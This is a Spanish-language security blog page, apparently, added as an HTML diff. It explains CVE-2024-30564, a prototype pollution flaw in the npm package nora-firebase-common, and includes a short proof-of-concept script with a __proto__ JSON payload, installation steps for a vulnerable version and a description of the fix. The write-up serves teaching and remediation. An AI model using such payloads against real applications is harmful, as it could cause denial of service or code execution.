@@ -1,0 +1,331 @@
+<!doctype html>
+<html lang="es" data-bs-theme="light">
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		<meta name="description" content="">
+		<meta name="author" content="Mark Otto, Jacob Thornton, and Bootstrap contributors">
+		<meta name="generator" content="Hugo 0.122.0">
+		<title>Blog Template · Bootstrap v5.3</title>
+
+		<link rel="canonical" href="https://getbootstrap.com/docs/5.3/examples/blog/">
+		<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@docsearch/css@3">
+		<link href="../../assets/dist/css/bootstrap.min.css" rel="stylesheet">
+		<link href="../../assets/css/navbars-offcanvas.css" rel="stylesheet">
+		<link rel="stylesheet" href="css/tabbared.css">
+		<link rel="stylesheet" href="css/sidebared.css">
+        <link rel="stylesheet" href="../../assets/css/index.css">
+		<link rel="stylesheet" href="css/blackarchvoid.css">
+		
+
+		<!-- Custom styles for this template -->
+		<link href="https://fonts.googleapis.com/css?family=Playfair&#43;Display:700,900&amp;display=swap" rel="stylesheet">
+		<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.6/dist/umd/popper.min.js" integrity="sha384-oBqDVmMz4fnFO9gybYlN4A1VJc3P35K5bTtrzF5gdfF4cws5pI5zVGMnk0j6d9hT" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.min.js" integrity="sha384-pzjw8f+ua7Kw1TIq0v8FqFjcJ7p1gCj7e4yZ6w5eIT8myKn6GOzmFV/1zVRj7qM8" crossorigin="anonymous"></script>
+
+		<!-- Custom styles for this template -->
+		<link href="../../assets/css/blog.css" rel="stylesheet">
+		<script src="js/tabbar.js"></script>
+	</head>
+	<body>
+		<svg xmlns="http://www.w3.org/2000/svg" class="d-none">
+			<symbol id="check2" viewBox="0 0 16 16">
+			<path d="M13.854 3.646a.5.5 0 0 1 0 .708l-7 7a.5.5 0 0 1-.708 0l-3.5-3.5a.5.5 0 1 1 .708-.708L6.5 10.293l6.646-6.647a.5.5 0 0 1 .708 0z"/>
+			</symbol>
+			<symbol id="circle-half" viewBox="0 0 16 16">
+			<path d="M8 15A7 7 0 1 0 8 1v14zm0 1A8 8 0 1 1 8 0a8 8 0 0 1 0 16z"/>
+			</symbol>
+			<symbol id="moon-stars-fill" viewBox="0 0 16 16">
+			<path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+			<path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/>
+			</symbol>
+			<symbol id="sun-fill" viewBox="0 0 16 16">
+			<path d="M8 12a4 4 0 1 0 0-8 4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+			</symbol>
+		</svg>
+
+		<div class="dropdown position-fixed bottom-0 end-0 mb-3 me-3 bd-mode-toggle">
+			<button class="btn btn-bd-primary py-2 dropdown-toggle d-flex align-items-center"
+				id="bd-theme"
+				type="button"
+				aria-expanded="false"
+				data-bs-toggle="dropdown"
+				aria-label="Toggle theme (auto)">
+				<svg class="bi my-1 theme-icon-active" width="1em" height="1em"><use href="#circle-half"></use></svg>
+				<span class="visually-hidden" id="bd-theme-text">Toggle theme</span>
+			</button>
+			<ul class="dropdown-menu dropdown-menu-end shadow" aria-labelledby="bd-theme-text">
+				<li>
+					<button type="button" class="dropdown-item d-flex align-items-center" data-bs-theme-value="light" aria-pressed="false">
+						<svg class="bi me-2 opacity-50" width="1em" height="1em"><use href="#sun-fill"></use></svg>
+						Light
+						<svg class="bi ms-auto d-none" width="1em" height="1em"><use href="#check2"></use></svg>
+					</button>
+				</li>
+				<li>
+					<button type="button" class="dropdown-item d-flex align-items-center" data-bs-theme-value="dark" aria-pressed="false">
+						<svg class="bi me-2 opacity-50" width="1em" height="1em"><use href="#moon-stars-fill"></use></svg>
+						Dark
+						<svg class="bi ms-auto d-none" width="1em" height="1em"><use href="#check2"></use></svg>
+					</button>
+				</li>
+			</ul>
+		</div>
+
+
+		<svg xmlns="http://www.w3.org/2000/svg" class="d-none">
+			<symbol id="aperture" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewBox="0 0 24 24">
+			<circle cx="12" cy="12" r="10"/>
+			<path d="M14.31 8l5.74 9.94M9.69 8h11.48M7.38 12l5.74-9.94M9.69 16L3.95 6.06M14.31 16H2.83m13.79-4l-5.74 9.94"/>
+			</symbol>
+			<symbol id="cart" viewBox="0 0 16 16">
+			<path d="M0 1.5A.5.5 0 0 1 .5 1H2a.5.5 0 0 1 .485.379L2.89 3H14.5a.5.5 0 0 1 .49.598l-1 5a.5.5 0 0 1-.465.401l-9.397.472L4.415 11H13a.5.5 0 0 1 0 1H4a.5.5 0 0 1-.491-.408L2.01 3.607 1.61 2H.5a.5.5 0 0 1-.5-.5zM3.102 4l.84 4.479 9.144-.459L13.89 4H3.102zM5 12a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm7 0a2 2 0 1 0 0 4 2 2 0 0 0 0-4zm-7 1a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm7 0a1 1 0 1 1 0 2 1 1 0 0 1 0-2z"/>
+			</symbol>
+			<symbol id="chevron-right" viewBox="0 0 16 16">
+			<path fill-rule="evenodd" d="M4.646 1.646a.5.5 0 0 1 .708 0l6 6a.5.5 0 0 1 0 .708l-6 6a.5.5 0 0 1-.708-.708L10.293 8 4.646 2.354a.5.5 0 0 1 0-.708z"/>
+			</symbol>
+		</svg>
+
+		<nav class="redboxsh navbar bg-body-tertiary" aria-label="Light offcanvas navbar">
+			<div class="container-fluid">
+				<img id="theme-image" class="imgmax" src="img/0xB-b.png" alt="Logo">
+				<button class="navbar-toggler" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasNavbarLight" aria-controls="offcanvasNavbarLight" aria-label="Toggle navigation">
+					<span class="navbar-toggler-icon"></span>
+				</button>
+				<div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasNavbarLight" aria-labelledby="offcanvasNavbarLightLabel">
+					<div class="offcanvas-header">
+						<img class="imgoff" src="../../img/skullh.png">
+						<!-- <h5 class="offcanvas-title" id="offcanvasNavbarLightLabel">ØxBogart</h5> -->
+						<button type="button" class="btn-close" data-bs-dismiss="offcanvas" aria-label="Close"></button>
+					</div>
+					<div class="offcanvas-body">
+						<ul class="navbar-nav justify-content-end flex-grow-1 pe-3">
+							<li class="nav-item">
+								<a class="nav-link" aria-current="page" href="#">Inicio</a>
+							</li>
+							<li class="nav-item">
+								<a class="nav-link" href="#">Link</a>
+							</li>
+							<li class="nav-item dropdown">
+								<a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
+									Dropdown
+								</a>
+								<ul class="dropdown-menu">
+									<li><a class="dropdown-item" href="#">Action</a></li>
+									<li><a class="dropdown-item" href="#">Another action</a></li>
+									<li>
+										<hr class="dropdown-divider">
+									</li>
+									<li><a class="dropdown-item" href="#">Something else here</a></li>
+								</ul>
+							</li>
+						</ul>
+						<form class="d-flex mt-3" role="search">
+							<input class="form-control me-2" type="search" placeholder="Search" aria-label="Search">
+							<button class="btn btn-outline-success" type="submit">Search</button>
+						</form>
+					</div>
+				</div>
+			</div>
+		</nav>
+
+		<div class="container"></div>
+
+		<main>
+			<h1 class="text-center">CVE-2024-30564 [PROTOTYPE POLLUTION]</h1>
+			<!-- TABBAR -->
+<div style="position: sticky; top: -1px; width: auto;" id="tabbar">
+    <a onclick="toggleDropdown()">
+        <div class="tabbar">
+            <span class="tab-title">TABLA DE CONTENIDO</span>
+            <div class="dropdown-content" id="dropdownContent"></div>
+        </div>
+    </a>
+    <div id="contenido">
+        <h5 class="blackc">@andrei-tatar/nora-firebase-common [CVE-2024-30564] Prototype Pollution</h5>
+        <div style="border-top: 1px solid lightgray; width: 100%; margin: 10px 0;"></div>
+        <a href="#VulnerabilityDetails" style="text-decoration: none;"><p class="blackc navred" style="margin-bottom: 6px; font-size: 16px;">☠ Detalles de la Vulnerabilidad</p></a>
+        <a href="#PROTOTYPEPOLLUTION" style="text-decoration: none;"><p class="blackc navred" style="margin-bottom: 6px; font-size: 16px;">☠ ¿Qué es Prototype Pollution?</p></a>
+        <a href="#DESCRIPTION" style="text-decoration: none;"><p class="blackc navred" style="margin-bottom: 6px; font-size: 16px;">☠ Descripción de la Vulnerabilidad [CVE-2024-30564]</p></a>
+        <a href="#EXPLOIT" style="text-decoration: none;"><p class="blackc navred" style="margin-bottom: 6px; font-size: 16px;">☠ Explotando CVE-2024-30564 [PoC]</p></a>
+        <a href="#REMEDIATE" style="text-decoration: none;"><p class="blackc navred" style="margin-bottom: 6px; font-size: 16px;">☠ Mitigación de la Vulnerabilidad en el Código Fuente</p></a>
+    </div>
+</div><!-- END TABBAR -->
+
+
+			<!-- SIDEBAR -->
+			<div id="main" style="position: sticky; top: 0;">
+				<button class="openbtn" onclick="toggleNav()">☠</button>
+			</div><br>
+			<div id="mySidebar" class="sidebar" style="display: none; position: sticky; top: 0; margin-top: -24px; padding-right: 1px;">
+				<a href="javascript:void(0)" class="closebtn" onclick="toggleNav()">×</a>
+				<span style="font-size: 25px; color: #ff0000;"><b>&nbsp;✎</b></span><span style="font-size: 25px; color: white;"> <b>Notas</b></span>
+				<hr style="color: #ff0000;">
+				<a><span style="color: #E5D400;">NPM</span><span class="spanx">: Administrador de paquetes predeterminado para el tiempo de ejecución de JavaScript Node.js</span></a>
+				<a><span style="color: #E5D400;">@andrei-tatar/nora-firebase-common</span><span class="spanx">: Backend NORA Firebase</span></a>
+				<a><span style="color: #E5D400;">__proto__</span><span class="spanx">: Atributo 'mágico' de JavaScript</span></a>
+				<a><span style="color: #E5D400;">updateState</span><span class="spanx">: Función vulnerable de NORA</span></a>
+			</div>
+			<!-- END SIDEBAR -->
+
+			<!-- SECCION DETALLES DE LA VULNERABILIDAD [RESUMEN] -->
+			<section id="VulnerabilityDetails" class="py-3">
+				<div class="container col-xxl-8 px-4 py-5">
+					<div class="row flex-lg-row align-items-center g-5 py-5">
+						<div class="mg col-lg-12 text-center">
+							<a style="font-size: 31px;">☠ <h2 style="display:inline-block;" class="pb-2 border-bottom">DETALLES DE LA VULNERABILIDAD</h2></a>
+							<ul class="w-75 text-start twbalance mg">
+								<li class="mb-2">
+									<b>Paquete:</b> @andrei-tatar/nora-firebase-common [npm]
+								</li>
+								<li class="mb-2"><b>Repositorio GitHub:</b>
+									<a href="https://github.com/andrei-tatar/nora-firebase-common" target="_blank" class="text-danger">https://github.com/andrei-tatar/nora-firebase-common</a>
+								</li>
+								<li class="mb-2"><b>GitHub Commit:</b>
+									<a href="https://github.com/andrei-tatar/nora-firebase-common/commit/bf30b75d51be04f6c1f884561a2" target="_blank" class="text-danger">https://github.com/andrei-tatar/nora-firebase-common/commit/bf30b75d51be04f6c1f884561a2</a>
+								</li>
+								<li class="mb-2"><b>Fecha de Publicación:</b> 18 de Abril de 2024</li>
+								<li class="mb-2"><b>Versiones Afectadas:</b> &gt;= 1.0.41, &lt; 1.12.3</li>
+								<li class="mb-2"><b>Versiones Parcheadas:</b> 1.12.3</li>
+								<li class="mb-2"><b>Gravedad:</b> <span class="text-danger">Alta</span></li>
+								<li class="mb-2"><b>CVE ID:</b> CVE-2024-30564</li>
+								<li class="mb-2"><b>Debilidades:</b> CWE-1321</li>
+								<li class="mb-2"><b>Impacto:</b> Un problema en andrei-tatar/nora-firebase-common entre v.1.0.41 y v.1.12.2 permite a un atacante remoto ejecutar código arbitrario a través de un script crafteado al parámetro updateState del método updateStateInternal.</li>
+							</ul>
+							<div class="d-grid gap-2 d-md-flex justify-content-md-start"></div>
+						</div>
+					</div>
+				</div>
+			</section>
+			<!-- END SECCION DETALLES DE LA VULNERABILIDAD [RESUMEN] -->
+
+			<div class="b-example-divider"></div>
+
+			<!-- ¿QUE ES PROTOTYPE POLLUTION? -->
+			<div class="container col-xxl-8 px-4 py-5" id="#PROTOTYPEPOLLUTION">
+				<div class="row flex-lg-row align-items-center g-5 py-5">
+					<div class="col-lg-12 text-center">
+						<a style="display: inline; font-size: 31px;">☠ </a><h2 style="display: inline;" class="pb-2 border-bottom">¿QUÉ ES PROTOTYPE POLLUTION?</h2>
+						<div class="w-75 text-start mg">
+						<p class="lead">La Contaminación de Prototipos hace referencia a la capacidad de inyectar propiedades en los prototipos de construcción existentes en el lenguaje JavaScript, como pueden ser los objetos.</p>
+						<p class="lead">JavaScript permite alterar todos los atributos de los objetos, incluidos sus atributos mágicos como serían <b>__proto__</b>, <b>constructor</b> y <b>prototype</b>. Un atacante podría manipular estos atributos para sobrescribir o contaminar un prototipo de objeto de una aplicación JavaScript del objeto base inyectando otros valores, lo cual alteraría el comportamiento original de la aplicacion.</p>
+						<p class="lead">Las propiedades del Object.prototype son heredadas por todos los objetos JavaScript a través de la cadena de prototipos. Cuando esto ocurre, se produce una Denegación de Servicio [<b>DoS</b>] al provocar excepciones de JavaScript, o también se manipula el código fuente de la aplicación para forzar la ruta de código que el atacante inyecta, lo que conduce a la ejecución remota de código [<b>RCE</b>].</p>
+					</div>
+                        <div class="d-grid gap-2 d-md-flex justify-content-md-start"></div>
+					</div>
+				</div>
+			</div>
+			<!-- END ¿QUE ES PROTOTYPE POLLUTION? -->
+
+			<div class="b-example-divider"></div>
+
+			<!-- DESCRIPCIÓN DE LA VULNERABILIDAD -->
+			<div class="container col-xxl-8 px-4 py-5" id="#PROTOTYPEPOLLUTION">
+				<div class="row flex-lg-row align-items-center g-5 py-5">
+					<div class="col-lg-12 text-center">
+						<a style="display: inline; font-size: 31px;">☠ </a><h2 style="display: inline;" class="pb-2 border-bottom">DESCRIPCIÓN DE LA VULNERABILIDAD</h2>
+						<div class="w-75 text-start mg">
+						<p class="lead">Todas las versiones de este módulo son vulnerables a la contaminación de prototipos a través de <b>updateState</b>.<br><br>El valor suministrado por el usuario a la función vulnerable y <b>updateStateInternal</b> copiará recursivamente todas las propiedades child, de la fuente [El valor suministrado por el usuario] al destino sin una validación de seguridad adecuada.</p>
+						<p class="lead">Un atacante puede explotar esta vulnerabilidad manipulando el <b>Object.prototype</b> incorporado a través de propiedades especiales como <b>__proto__</b> o <b>constructor.prototype</b>.</p>
+						<p class="lead">Potencialmente conduce a la alteración del comportamiento de todos los objetos y, en consecuencia, el atacante escalará el ataque a una denegación de servicio [<b>DoS</b>], una ejecución remota de código [<b>RCE</b>] o a una escalada de privilegios.</p>
+					</div>
+                        <div class="d-grid gap-2 d-md-flex justify-content-md-start"></div>
+					</div>
+				</div>
+			</div>
+			<!-- END DESCRIPCIÓN DE LA VULNERABILIDAD -->
+
+			<div class="b-example-divider"></div>
+
+			<!-- EXPLOTANDO CVE-2024-30564 [PoC] -->
+			<div class="container col-xxl-8 px-4 py-5" id="#PROTOTYPEPOLLUTION">
+				<div class="row flex-lg-row align-items-center g-5 py-5">
+				  <div class="col-lg-12 text-center">
+					<a style="display: inline; font-size: 31px;">☠ </a>
+					<h2 style="display: inline;" class="pb-2 border-bottom">EXPLOTANDO CVE-2024-30564 [PoC]</h2>
+					<div class="w-75 mg text-start">
+					  <p class="lead text-start"><b><a style="color: #DB0000;">⦿</a></b> Crear el directorio de trabajo y el archivo <b>cve-2024-30564.js</b> para explotar prueba de concepto [PoC]</p>
+					</div>
+				  </div>
+				  <div class="d-grid gap-2 d-md-flex justify-content-md-start"></div>
+				  <div class="container">
+					<div class="Terminal">
+					  <div class="Terminal__Toolbar">
+						<div class="Toolbar__buttons">
+						  <button class="Toolbar__button Toolbar__button--exit">&#10005;</button>
+						  <button class="Toolbar__button">&#9472;</button>
+						  <button class="Toolbar__button">&#9723;</button>
+						</div>
+						<p class="Toolbar__user">0xBogart@blackarch:~</p>
+					  </div>
+					  <div class="Terminal__body">
+						<div class="ml1 cyan Terminal__text"><b>&#47;&#47; PoC cve-2024-30564.js</b></div>
+						<div class="ml1 mt-3 Terminal__text"><b>&#40;<a class="yellow">async</a> &#40;&#41; &#61;&gt; &#123;</b></div>
+						<div class="ml3 Terminal__text"><b><a class="yellow">const</a> lib &#61; <a class="yellow">await import</a>(<a class="purple">'@andrei-tatar/nora-firebase-common'</a>);</b></div>
+						<div class="ml1 Terminal__text"><b><a class="cyan">var</a> BAD_JSON &#61; JSON.parse(<a class="purple">&#39;{&#34;__proto__&#34;:{&#34;Polución&#34;:true}}&#39;</a>) </b></div>
+						<div class="ml1 mt4 Terminal__text"><b><a class="cyan">var</a> victim &#61; <a class="cyan">&#123;&#125;</a></b></div>
+						<div class="ml1 Terminal__text"><b>console.log&#40;<a class="purple">&#34;Antes de la Polución: &#34;</a>, JSON.stringify&#40;victim.__proto__&#41;&#41;&#59;</b></div>
+						<div class="ml1 Terminal__text"><b>try <a class="cyan">&#123;</a></b></div>
+						<div class="mt4 ml3 Terminal__text"><b>lib.updateState &#40;BAD_JSON, <a class="cyan">&#123;&#125;</a>&#41;</b></div>
+						<div class="ml6 Terminal__text"><b><a class="cyan">&#125;</a>&nbsp;<a class="yellow">catch</a> &#40;e&#41; <a class="cyan">&#123;&nbsp;&#125;</a></b></div>
+						<div class="ml1 Terminal__text"><b>console.log(<a class="purple">&#34;Después de la Polución: &#34;</a>, JSON.stringify(victim.__proto__));</b></div>
+						<div class="ml1 Terminal__text"><b><a class="yellow">delete</a>&nbsp;<a class="darkcyan">Object</a>.prototype.polluted&#59;</b></div>
+						<div class="ml1 Terminal__text"><b><a class="cyan">&#125;</a>&#41;&#40;&#41;&#59;</b></div>
+						<!--  <div class="Terminal__Prompt">
+						<span class="Prompt__user">cody@ubuntu:</span><span class="Prompt__location">~</span><span class="Prompt__dollar">$</span>
+						  <span class="Prompt__cursor"></span>
+						</div> -->
+					  </div>
+					</div>
+				  </div>
+				  <!-- END TERMINAL -->
+				   <div class="w-75 mt10 mg text-start">
+					<p class="lead"><b><a style="color: #DB0000;">⦿</a></b> Instalar una versión vulnerable del paquete: <b>npm install @andrei-tatar/nora-firebase-common@1.12.0 &amp;&amp; npm fund</p>
+						<img src="img/npmandrei.png" width="100%">
+
+					<p class="lead mt10"><b><a style="color: #DB0000;">⦿</a></b> Ejecutar la PoC: <b>node cve-2024-30564.js</b></p>
+						<img src="img/nodeandrei.png" width="100%">
+
+					<p class="lead mt10">Como puede verse, antes de la contaminación las llaves <b>&#123;&#125;</b> están vacías, y después de la contaminación almacenan la propiedad &#123;<b>"Polución":true</b>&#125; del objeto <b>BAD_JSON</b>.</p>
+					<p class="lead">El exploit importa el paquete <b>@andrei-tatar/nora-firebase-common</b> de manera asíncrona mediante la declaración <b>import</b>. Crea un objeto JSON malicioso llamado <b>BAD_JSON</b> con una propiedad <b>__proto__</b> que contaminará al objeto <b>victim</b>.</p>
+					<p class="lead">Se define un objeto vacío llamado <b>victim</b> que será el objetivo de la contaminación de prototipo e imprime en consola su estado antes de realizar la contaminación.</p>
+					<p class="lead">Después llama a la función <b>updateState</b> del paquete <b>@andrei-tatar/nora-firebase-common</b> pasándole el objeto BAD_JSON.</p>
+				</div>
+			</div>
+		</div>
+	</div><!-- END EXPLOTANDO CVE-2024-30564 [PoC] -->
+
+	<div class="b-example-divider"></div>
+
+	<!-- ¿QUE ES PROTOTYPE POLLUTION? -->
+	<div class="container col-xxl-8 px-4 py-5" id="#PROTOTYPEPOLLUTION">
+		<div class="row flex-lg-row align-items-center g-5 py-5">
+			<div class="col-lg-12 text-center">
+				<a style="display: inline; font-size: 31px;">☠ </a><h2 style="display: inline;" class="pb-2 border-bottom">MITIGACIÓN DE LA VULNERABILIDAD EN EL CÓDIGO FUENTE</h2>
+				<div class="w-75 text-start mg">
+				<p class="lead">En GitHub pueden verse las correcciones aplicadas al código fuente de los archivos <b>update-state.test.ts</b> y <b>update-state.ts</b>.</p>
+				<p class="lead">Ahora update-state.test.ts verifica que la función <b>updateState</b> no acepte actualizaciones que provengan de propiedades del prototipo <b>__proto__</b>. Esta implementación asegura que <b>__proto__</b> ya no sea aceptado como una clave válida.</p>
+				<img src="img/update-state.test.ts.png" width="100%">
+				<p class="lead mt10">Y por otro lado, la implementación realizada en <b>update-state.ts</b> define el array <b>ignoreKeys</b> que contiene claves que no serán aceptadas durante la actualización de estado. Esto incluye <b>'__proto__'</b>, <b>'constructor'</b> y <b>'prototype'</b>, ya que son comunes en ataques de <b>Prototype Pollution</b>.<br><br>Así que antes de procesar cada clave en el objeto de actualización, verificará si la clave está en el array <b>ignoreKeys</b>. Si lo está, se omitirá esa clave y pasará a la siguiente.</p>
+				<img src="img/update-state.ts.png" width="100%">
+			</div>
+				<div class="d-grid gap-2 d-md-flex justify-content-md-start"></div>
+			</div>
+		</div>
+	</div>
+	<!-- END ¿QUE ES PROTOTYPE POLLUTION? -->
+
+	<div class="b-example-divider"></div>
+</main>
+
+<!-- FOOTER -->
+ <footer class="container">
+	<img class="mt-3" id="theme-image" src="../../img/skullh.png" style="margin-left: 45%;" width="50px" alt="Logo">
+	<p class="float-end"><a href="#">Back to top</a></p>
+	
+</footer>
+<script src="../../assets/dist/js/bootstrap.bundle.min.js"></script>
+<script src="../../assets/js/color-modes.js"></script>
+<script src="js/sidebar.js"></script>	
+	</body>
+</html>
